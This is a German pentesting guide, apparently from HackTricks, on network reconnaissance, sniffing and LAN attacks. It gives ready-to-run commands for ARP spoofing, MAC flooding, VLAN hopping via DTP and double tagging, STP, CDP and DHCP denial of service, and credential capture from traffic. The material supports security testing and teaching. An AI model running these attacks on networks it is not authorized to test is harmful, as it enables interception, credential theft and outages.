# Pentesting Netzwerk

{{#include ../../banners/hacktricks-training.md}}



## Hosts von außen entdecken

Dies ist ein **kurzer Abschnitt** darüber, wie man **IPs, die antworten**, aus dem **Internet** findet.\
In dieser Situation hast du einen **scope of IPs** (vielleicht sogar mehrere **ranges**) und möchtest einfach herausfinden, **welche IPs antworten**.

### ICMP

Dies ist die **einfachste** und **schnellste** Methode, um zu erkennen, ob ein Host online ist oder nicht.\
Du kannst versuchen, einige **ICMP**-Pakete zu senden und **Antworten zu erwarten**. Am einfachsten ist es, eine **echo request** zu schicken und auf die Antwort zu warten. Das kannst du mit einem einfachen `ping` oder mit `fping` für **ranges** tun.\
Du kannst auch **nmap** verwenden, um andere Arten von ICMP-Paketen zu senden (das umgeht Filter gegen die üblichen ICMP echo request-response).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

Es ist sehr häufig, dass alle Arten von ICMP-Paketen gefiltert werden. Dann ist alles, was du tun kannst, um zu prüfen, ob ein host up ist, **zu versuchen, open ports zu finden**. Jeder host hat **65535 ports**, also, wenn du einen "großen" scope hast, kannst du **nicht** testen, ob **jeder Port** jedes hosts offen ist oder nicht, das würde zu viel Zeit in Anspruch nehmen.\
Dann brauchst du einen **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) und eine Liste der **ports mehr used:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Du könntest diesen Schritt auch mit `nmap` durchführen, aber es ist langsamer und `nmap` hat Probleme, aktive Hosts zu erkennen.

### HTTP Port-Erkennung

Dies ist nur eine TCP-Port-Erkennung, nützlich wenn du **dich auf das Entdecken von HTTP** **Diensten** konzentrieren möchtest:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

Sie können auch versuchen zu prüfen, ob ein **UDP port open** vorliegt, um zu entscheiden, ob Sie einem **host** **mehr Aufmerksamkeit schenken** sollten. Da UDP-Services normalerweise **nicht antworten** mit **irgendwelchen Daten** auf ein reguläres leeres UDP probe packet, ist es schwierig zu sagen, ob ein port gefiltert ist oder offen. Die einfachste Möglichkeit, das zu entscheiden, ist, ein packet zu senden, das zum laufenden service gehört, und da Sie nicht wissen, welcher service läuft, sollten Sie die wahrscheinlichsten basierend auf der port number ausprobieren:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Die zuvor vorgeschlagene nmap-Zeile wird die **top 1000 UDP ports** auf jedem Host innerhalb des **/24**-Bereichs testen, aber selbst das dauert **>20min**. Wenn du **schnellste Ergebnisse** brauchst, kannst du [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) verwenden: `./udp-proto-scanner.pl 199.66.11.53/24` Dies sendet diese **UDP probes** an ihren **expected port** (für ein /24-Netz dauert das nur 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port-Erkennung
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Hier findest du einen guten Leitfaden zu allen bekannten Wifi-Angriffen zum Zeitpunkt der Erstellung:


{{#ref}}
../pentesting-wifi/
{{#endref}}

## Hosts von innen entdecken

Wenn du im Netzwerk drin bist, ist eine der ersten Maßnahmen, die du durchführen möchtest, **andere hosts zu entdecken**. Je nachdem, **wie viel Lärm** du erzeugen kannst/möchtest, können unterschiedliche Vorgehensweisen gewählt werden:

### Passiv

Du kannst diese Tools verwenden, um hosts in einem verbundenen Netzwerk passiv zu entdecken:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktiv

Beachte, dass die in [_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) kommentierten Techniken hier ebenfalls **angewendet werden können**.\
Aber, da du dich im **gleichen Netzwerk** wie die anderen Hosts befindest, kannst du **mehr machen**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Aktives ICMP

Beachte, dass die in _Host-Erkennung von außen_ ([_**ICMP**_](#icmp)) beschriebenen Techniken auch **hier angewendet werden können**.\
Da du dich jedoch im **gleichen Netzwerk** wie die anderen Hosts befindest, kannst du **mehr tun**:

- Wenn du eine **Subnetz-Broadcast-Adresse** per **ping** anpingst, sollte der ping bei **jedem Host** ankommen und sie könnten **dir** **antworten**: `ping -b 10.10.5.255`
- Wenn du die **Netzwerk-Broadcast-Adresse** anpingst, könntest du sogar Hosts in **anderen Subnetzen** finden: `ping -b 255.255.255.255`
- Verwende die `-PE`, `-PP`, `-PM` Flags von `nmap`, um Host-Erkennung durchzuführen, wobei jeweils **ICMPv4 echo**, **timestamp**, und **subnet mask requests** gesendet werden: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan wird verwendet, um Computer durch eine **Netzwerk-Nachricht** einzuschalten. Das Magic Packet, das zum Einschalten des Computers verwendet wird, ist ein Paket, in dem eine **MAC Dst** angegeben ist und das dann **16-mal wiederholt** innerhalb desselben Pakets vorkommt.\
Solche Pakete werden üblicherweise in einem **ethernet 0x0842** oder in einem **UDP packet to port 9** gesendet.\
Wenn **keine [MAC]** angegeben ist, wird das Paket an **broadcast ethernet** gesendet (und die Broadcast-MAC wird die sein, die wiederholt wird).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Scannen von Hosts

Sobald Sie alle IPs (extern oder intern) entdeckt haben, die Sie eingehend scannen möchten, können verschiedene Aktionen durchgeführt werden.

### TCP

- **Offener** Port: _SYN --> SYN/ACK --> RST_
- **Geschlossener** Port: _SYN --> RST/ACK_
- **Gefilterter** Port: _SYN --> \[NO RESPONSE]_
- **Gefilterter** Port: _SYN --> ICMP message_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Es gibt 2 Optionen, um einen UDP-Port zu scannen:

- Sende ein **UDP packet** und prüfe auf die Antwort _**ICMP unreachable**_, wenn der Port **geschlossen** ist (in mehreren Fällen wird ICMP **gefiltert**, sodass du keine Information darüber erhältst, ob der Port geschlossen oder offen ist).
- Sende **formatted datagrams**, um eine Antwort von einem **service** zu provozieren (z. B. DNS, DHCP, TFTP und andere, wie in _nmap-payloads_ aufgeführt). Wenn du eine **response** erhältst, ist der Port **offen**.

**Nmap** wird **beide** Optionen mit "-sV" mischen (UDP scans sind sehr langsam), beachte jedoch, dass UDP scans langsamer sind als TCP scans:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** ist dafür ausgelegt, zusammen mit **TCP (Transmission Control Protocol)** und **UDP (User Datagram Protocol)** verwendet zu werden. Sein Hauptzweck ist die Ermöglichung des Transports von Telefondaten über IP-Netzwerke und spiegelt viele der Zuverlässigkeitsfunktionen wider, die in **Signaling System 7 (SS7)** zu finden sind. **SCTP** ist ein Kernbestandteil der **SIGTRAN**-Protokollfamilie, die darauf abzielt, SS7-Signale über IP-Netzwerke zu transportieren.

Die Unterstützung für **SCTP** wird von verschiedenen Betriebssystemen bereitgestellt, wie **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** und **VxWorks**, was auf seine breite Akzeptanz und Nützlichkeit im Bereich Telekommunikation und Netzwerke hinweist.

nmap bietet zwei verschiedene Scans für SCTP an: _-sY_ und _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS and IPS evasion


{{#ref}}
ids-evasion.md
{{#endref}}

### **Weitere nmap-Optionen**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Aufdecken interner IP-Adressen

**Fehlkonfigurierte Router, Firewalls und Netzwerkgeräte** antworten manchmal auf Netzwerk-Scans mit **nicht-öffentlichen Quelladressen**. **tcpdump** kann verwendet werden, um während Tests Pakete zu identifizieren, die von privaten Adressen empfangen wurden. Konkret können unter **Kali Linux** Pakete auf dem **eth2 interface** erfasst werden, das vom öffentlichen Internet erreichbar ist. Es ist wichtig zu beachten, dass solche Pakete wahrscheinlich gefiltert werden, wenn Ihre Umgebung hinter einem NAT oder einer Firewall liegt.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Sniffing: Durch das Analysieren aufgezeichneter frames und packets kannst du Details über IP ranges, subnet sizes, MAC addresses und hostnames herausfinden. Wenn das Netzwerk falsch konfiguriert ist oder die switching fabric unter Last steht, können Angreifer über passive network sniffing sensible Daten erfassen.

Wenn ein switched Ethernet-Netzwerk richtig konfiguriert ist, siehst du nur broadcast frames und Material, das an deine MAC address bestimmt ist.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
Man kann auch packets von einer entfernten Maschine über eine SSH-Session mit Wireshark als GUI in Echtzeit erfassen.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Selbstverständlich.

### Anmeldeinformationen erfassen

Man kann Tools wie [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) verwenden, um Anmeldeinformationen aus einem pcap oder einer Live-Schnittstelle zu parsen.

## LAN-Angriffe

### ARP spoofing

ARP Spoofing besteht darin, gratuitous ARPResponses zu senden, um anzuzeigen, dass die IP eines Geräts die MAC-Adresse unseres Geräts hat. Dann ändert das Opfer die ARP-Tabelle und kontaktiert unser Gerät jedes Mal, wenn es die gespoofte IP erreichen will.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Überflute die CAM-Tabelle des Switches, indem du viele Pakete mit unterschiedlichen Quell-MAC-Adressen sendest. Wenn die CAM-Tabelle voll ist, beginnt der Switch, sich wie ein Hub zu verhalten (alle Pakete werden gebroadcastet).
```bash
macof -i <interface>
```
In modernen Switches wurde diese Verwundbarkeit behoben.

### 802.1Q VLAN / DTP Attacks

#### Dynamic Trunking

Das Dynamic Trunking Protocol (DTP) ist als Link-Layer-Protokoll konzipiert, um ein automatisches System für Trunking zu ermöglichen, sodass Switches Ports automatisch für den Trunk-Modus (Trunk) oder den Nicht-Trunk-Modus auswählen können. Der Einsatz von DTP wird oft als Indikator für suboptimales Netzwerkdesign angesehen und unterstreicht die Bedeutung, Trunks nur dort manuell zu konfigurieren, wo sie erforderlich sind, sowie eine ordnungsgemäße Dokumentation sicherzustellen.

Standardmäßig sind Switch-Ports auf den Betrieb im Dynamic Auto-Modus eingestellt, was bedeutet, dass sie bereit sind, Trunking zu initiieren, wenn ein benachbarter Switch dazu veranlasst. Ein Sicherheitsproblem entsteht, wenn sich ein pentester oder Angreifer mit dem Switch verbindet und einen DTP Desirable frame sendet, wodurch der Port in den Trunk-Modus gezwungen wird. Diese Aktion ermöglicht es dem Angreifer, VLANs durch Analyse von STP-Frames zu enumerieren und die VLAN-Segmentierung zu umgehen, indem er virtuelle Interfaces einrichtet.

Das Vorhandensein von DTP in vielen Switches per default kann von Angreifern ausgenutzt werden, um das Verhalten eines Switches zu imitieren und so Zugriff auf den Verkehr aller VLANs zu erhalten. Das Skript [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) wird verwendet, um ein Interface zu überwachen und anzuzeigen, ob ein Switch im Default-, Trunk-, Dynamic-, Auto- oder Access-Modus ist — letztere Konfiguration ist die einzige, die gegen VLAN hopping-Angriffe immun ist. Dieses Tool bewertet den Verwundbarkeitsstatus des Switches.

Sollte eine Verwundbarkeit im Netzwerk festgestellt werden, kann das Tool _**Yersinia**_ verwendet werden, um via DTP "enable trunking" zu erzwingen, wodurch Pakete aus allen VLANs beobachtet werden können.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Um die VLANs zu enumerieren, ist es auch möglich, den DTP Desirable Frame mit dem Skript [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)** zu erzeugen. D**as Skript darf unter keinen Umständen unterbrochen werden. Es injiziert DTP Desirable alle drei Sekunden. **Die dynamisch erstellten Trunk-Kanäle auf dem Switch bestehen nur fünf Minuten. Nach fünf Minuten fällt der Trunk weg.**
```
sudo python3 DTPHijacking.py --interface eth0
```
Ich möchte darauf hinweisen, dass **Access/Desirable (0x03)** anzeigt, dass der DTP-Frame vom Desirable-Typ ist, was dem Port sagt, in den Trunk-Modus zu wechseln. Und **802.1Q/802.1Q (0xa5** zeigt den **802.1Q** Kapselungstyp an.

Durch die Analyse der STP-Frames **erfahren wir von der Existenz von VLAN 30 und VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Angriff auf bestimmte VLANs

Sobald Sie die VLAN-IDs und IP-Werte kennen, können Sie **eine virtuelle Schnittstelle konfigurieren, um ein bestimmtes VLAN anzugreifen**.\
Wenn DHCP nicht verfügbar ist, verwenden Sie _ifconfig_, um eine statische IP-Adresse zu setzen.

<details>
<summary>VLAN-Interface-Konfiguration (Beispiel)</summary>
```bash
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```
</details>
```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatischer VLAN Hopper

Der beschriebene Angriff mittels **Dynamic Trunking und dem Erstellen virtueller Schnittstellen sowie dem Auffinden von Hosts in anderen VLANs** wird **automatisch** von dem Tool durchgeführt: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Wenn ein Angreifer den Wert der **MAC, IP and VLAN ID of the victim host** kennt, könnte er versuchen, einen Frame zu **double tag a frame** — also mit seinem eigenen VLAN und dem VLAN des Opfers zu versehen — und ein Paket zu senden. Da das **victim won't be able to connect back** mit dem Angreifer, ist die **beste Option für den Angreifer, via UDP zu kommunizieren** mit Protokollen, die interessante Aktionen durchführen können (wie SNMP).

Eine weitere Option für den Angreifer ist, einen **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** zu starten (wahrscheinlich über das Internet). Danach könnte der Angreifer auf dem zweiten von ihm kontrollierten Host mitsniffen, ob dieser Pakete vom Opfer erhält.

![](<../../images/image (190).png>)

Um diesen Angriff durchzuführen, können Sie scapy verwenden: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

Wenn Sie **Zugriff auf einen Switch haben, mit dem Sie direkt verbunden sind**, können Sie die **VLAN-Segmentierung** im Netzwerk umgehen. Schalten Sie einfach **den Port in den trunk mode** (auch als trunk bekannt), erstellen Sie virtuelle Interfaces mit den IDs der Ziel-VLANs und konfigurieren Sie eine IP-Adresse. Sie können versuchen, die Adresse dynamisch per DHCP anzufordern oder sie statisch zu konfigurieren. Es kommt auf den Einzelfall an.

{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

In bestimmten Umgebungen, wie Gast-WLANs, werden Einstellungen für **port isolation (auch als private VLAN bekannt)** implementiert, um zu verhindern, dass Clients, die mit einem Access Point verbunden sind, direkt miteinander kommunizieren. Es wurde jedoch eine Technik identifiziert, die diese Isolationsmaßnahmen umgehen kann. Diese Technik nutzt entweder das Fehlen von network ACLs oder deren fehlerhafte Konfiguration aus, wodurch IP-Pakete über einen Router geroutet werden können, um einen anderen Client im selben Netzwerk zu erreichen.

Der Angriff wird durchgeführt, indem ein **Paket erstellt wird, das die IP-Adresse des Zielclients trägt, jedoch mit der MAC-Adresse des Routers**. Dadurch leitet der Router das Paket irrtümlich an den Zielclient weiter. Dieser Ansatz ähnelt dem bei Double Tagging Attacks verwendeten, bei dem die Kontrolle über einen für das Opfer zugänglichen Host genutzt wird, um die Sicherheitslücke auszunutzen.

**Wesentliche Schritte des Angriffs:**

1. **Erstellung eines Pakets:** Es wird ein speziell gestaltetes Paket erstellt, das die IP-Adresse des Zielclients enthält, jedoch mit der MAC-Adresse des Routers.
2. **Ausnutzung des Router-Verhaltens:** Das gefertigte Paket wird an den Router gesendet, der aufgrund der Konfiguration das Paket an den Zielclient weiterleitet und damit die durch private VLAN-Einstellungen bereitgestellte Isolation umgeht.

### VTP Attacks

VTP (VLAN Trunking Protocol) zentralisiert die VLAN-Verwaltung. Es verwendet Revisionsnummern, um die Integrität der VLAN-Datenbank zu gewährleisten; jede Änderung erhöht diese Nummer. Switches übernehmen Konfigurationen mit höheren Revisionsnummern und aktualisieren ihre eigenen VLAN-Datenbanken.

#### VTP Domain Roles

- **VTP Server:** Verwaltet VLANs — erstellt, löscht, ändert. Sendet VTP-Ankündigungen an Domain-Mitglieder.
- **VTP Client:** Empfängt VTP-Ankündigungen, um seine VLAN-Datenbank zu synchronisieren. Diese Rolle ist in der lokalen VLAN-Konfiguration eingeschränkt.
- **VTP Transparent:** Beteiligt sich nicht an VTP-Updates, leitet jedoch VTP-Ankündigungen weiter. Nicht von VTP-Angriffen betroffen, behält es eine konstante Revisionsnummer von null bei.

#### VTP Advertisement Types

- **Summary Advertisement:** Wird alle 300 Sekunden vom VTP-Server gesendet und enthält wichtige Domain-Informationen.
- **Subset Advertisement:** Wird nach VLAN-Konfigurationsänderungen gesendet.
- **Advertisement Request:** Vom VTP-Client ausgesendet, um ein Summary Advertisement anzufordern, typischerweise als Reaktion auf das Erkennen einer höheren Konfigurationsrevisionsnummer.

VTP-Schwachstellen sind ausschließlich über trunk ports ausnutzbar, da VTP-Ankündigungen nur über diese zirkulieren. Nach DTP-Angriffsszenarien kann der Fokus auf VTP wechseln. Tools wie Yersinia können VTP-Angriffe erleichtern, mit dem Ziel, die VLAN-Datenbank zu löschen und so das Netzwerk effektiv zu stören.

Hinweis: Diese Diskussion bezieht sich auf VTP Version 1 (VTPv1).
```bash
yersinia -G # Launch Yersinia in graphical mode
```
In Yersinia's graphical mode wähle die Option deleting all VTP vlans, um die VLAN-Datenbank zu leeren.

### STP-Angriffe

**Wenn du keine BPDU-Frames auf deinen Schnittstellen erfassen kannst, ist es unwahrscheinlich, dass du einen STP-Angriff erfolgreich durchführst.**

#### **STP BPDU DoS**

Das Senden vieler BPDUs — TCP (Topology Change Notification) oder Conf (die BPDUs, die gesendet werden, wenn die Topologie erstellt wird) — überlastet die Switches, sodass sie nicht mehr korrekt arbeiten.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Wenn ein TCP gesendet wird, wird die CAM table der switches nach 15s gelöscht. Wenn du dann kontinuierlich diese Art von packets sendest, wird die CAM table kontinuierlich neu gestartet (oder alle 15segs) und wenn sie neu gestartet ist, verhält sich der switch wie ein hub
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

Der Angreifer simuliert das Verhalten eines Switches, um der STP root des Netzwerks zu werden. Dann wird mehr Datenverkehr über ihn geleitet. Das ist interessant, wenn du mit zwei verschiedenen Switches verbunden bist.\
Dies wird durchgeführt, indem BPDUs CONF packets gesendet werden, die angeben, dass der **priority**-Wert kleiner ist als die tatsächliche Priorität des aktuellen root switch.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Wenn der attacker mit zwei Switches verbunden ist, kann er die Wurzel des neuen Baums werden und der gesamte Verkehr zwischen diesen Switches über ihn geleitet werden** (a MITM attack will be performed).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP Angriffe

CISCO Discovery Protocol (CDP) ist unerlässlich für die Kommunikation zwischen CISCO-Geräten und ermöglicht ihnen, sich gegenseitig zu identifizieren und Konfigurationsdetails auszutauschen.

#### Passive Datensammlung <a href="#id-0e0f" id="id-0e0f"></a>

CDP ist so konfiguriert, dass es Informationen über alle Ports aussendet, was ein Sicherheitsrisiko darstellen kann. Ein Angreifer, der sich an einen Switch-Port anschließt, könnte network sniffers wie **Wireshark**, **tcpdump** oder **Yersinia** einsetzen. Diese Aktion kann sensible Daten über das Netzwerkgerät offenlegen, einschließlich Modell und der Version von Cisco IOS, die darauf läuft. Der Angreifer könnte dann spezifische Schwachstellen in der identifizierten Cisco IOS-Version anvisieren.

#### Auslösen von CDP Table Flooding <a href="#id-0d6a" id="id-0d6a"></a>

Ein aggressiverer Ansatz besteht darin, eine Denial of Service (DoS)-Attacke durch Überfluten des Speichers des Switches auszulösen, indem man sich als legitime CISCO-Geräte ausgibt. Nachfolgend die Befehlsfolge zum Starten eines solchen Angriffs mit Yersinia, einem Netzwerk-Tool, das für Tests entwickelt wurde:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Während dieses Angriffs werden die CPU des Switches und die CDP neighbor table stark belastet, was aufgrund des übermäßigen Ressourcenverbrauchs häufig als **“Netzwerkparalyse”** bezeichnet wird.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.

### VoIP-Angriffe und das VoIP Hopper Tool

VoIP-Telefone, die zunehmend mit IoT-Geräten integriert werden, bieten Funktionen wie das Entriegeln von Türen oder die Steuerung von Thermostaten über spezielle Telefonnummern. Diese Integration kann jedoch Sicherheitsrisiken bergen.

Das Tool [**voiphopper**](http://voiphopper.sourceforge.net) ist dafür ausgelegt, ein VoIP-Telefon in verschiedenen Umgebungen (Cisco, Avaya, Nortel, Alcatel-Lucent) zu emulieren. Es ermittelt die VLAN ID des Sprachnetzwerks mithilfe von Protokollen wie CDP, DHCP, LLDP-MED und 802.1Q ARP.

**VoIP Hopper** bietet drei Modi für das Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): Analysiert Netzwerkpakete, um die VLAN ID zu identifizieren.
2. **Spoof Mode** (`-c 1`): Erzeugt benutzerdefinierte Pakete, die diejenigen eines echten VoIP-Geräts nachahmen.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Sendet Pakete, die mit denen eines bestimmten Cisco IP-Telefonmodells identisch sind.

Der bevorzugte Modus für Geschwindigkeit ist der dritte. Er erfordert die Angabe von:

- der Netzwerkschnittstelle des Angreifers (`-i` Parameter).
- dem Namen des zu emulierenden VoIP-Geräts (`-E` Parameter), entsprechend dem Cisco-Namensformat (z. B. SEP gefolgt von einer MAC address).

In Unternehmensumgebungen kann man, um ein bestehendes VoIP-Gerät zu imitieren, folgendes tun:

- Das MAC-Label auf dem Telefon überprüfen.
- In den Display-Einstellungen des Telefons nach Modellinformationen suchen.
- Das VoIP-Gerät an einen Laptop anschließen und CDP-Anfragen mit Wireshark beobachten.

Ein Beispielbefehl, um das Tool im dritten Modus auszuführen, wäre:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP Attacks

#### Enumeration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Two types of DoS** könnten gegen DHCP servers durchgeführt werden. Die erste besteht darin, **simulate enough fake hosts to use all the possible IP addresses**.\
Dieser Angriff funktioniert nur, wenn du die Antworten des DHCP server sehen und das Protokoll komplett abschließen kannst (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Zum Beispiel ist dies **not possible in Wifi networks**.

Eine andere Möglichkeit, einen DHCP DoS durchzuführen, ist, ein **DHCP-RELEASE packet using as source code every possible IP** zu senden. Dann wird der server denken, dass alle die IP nicht mehr verwenden.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Eine automatisiertere Art, dies zu tun, ist die Verwendung des Tools [DHCPing](https://github.com/kamorin/DHCPig)

